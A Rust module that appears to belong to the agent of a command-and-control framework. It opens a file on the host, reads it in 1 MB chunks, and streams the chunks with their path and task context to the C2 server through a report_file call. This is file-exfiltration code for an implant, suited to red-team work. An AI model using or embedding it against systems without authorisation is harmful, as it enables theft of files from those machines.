use alloc::boxed::Box;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::io::Read;
use std::sync::Mutex;

struct FileChunkIterator {
    file: std::fs::File,
    chunk_size: usize,
    context: Option<report_file_request::Context>,
    path: String,
    metadata_sent: bool,
    error: Arc<Mutex<Option<String>>>,
}

impl Iterator for FileChunkIterator {
    type Item = c2::ReportFileRequest;

    fn next(&mut self) -> Option<Self::Item> {
        if self.error.lock().unwrap().is_some() {
            return None;
        }

        let mut buffer = vec![0; self.chunk_size];
        match self.file.read(&mut buffer) {
            Ok(0) => None, // EOF
            Ok(n) => {
                buffer.truncate(n);

                let metadata = if !self.metadata_sent {
                    self.metadata_sent = true;
                    Some(eldritch::FileMetadata {
                        path: self.path.clone(),
                        ..Default::default()
                    })
                } else {
                    None
                };

                let file_msg = eldritch::File {
                    metadata,
                    chunk: buffer,
                };

                Some(c2::ReportFileRequest {
                    context: self.context.clone(),
                    chunk: Some(file_msg),
                    kind: c2::ReportFileKind::Ondisk as i32,
                })
            }
            Err(e) => {
                *self.error.lock().unwrap() = Some(e.to_string());
                None
            }
        }
    }
}

pub fn file(agent: Arc<dyn Agent>, context: Context, path: String) -> Result<(), String> {
    let file = std::fs::File::open(&path).map_err(|e| e.to_string())?;

    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
    };

    let error = Arc::new(Mutex::new(None));

    let iter = FileChunkIterator {
        file,
        chunk_size: 1024 * 1024, // 1MB
        context: context_val,
        path: path.clone(),
        metadata_sent: false,
        error: error.clone(),
    };

    agent.report_file(Box::new(iter)).map(|_| ())?;

    if let Some(e) = error.lock().unwrap().as_ref() {
        return Err(e.clone());
    }

    Ok(())
}
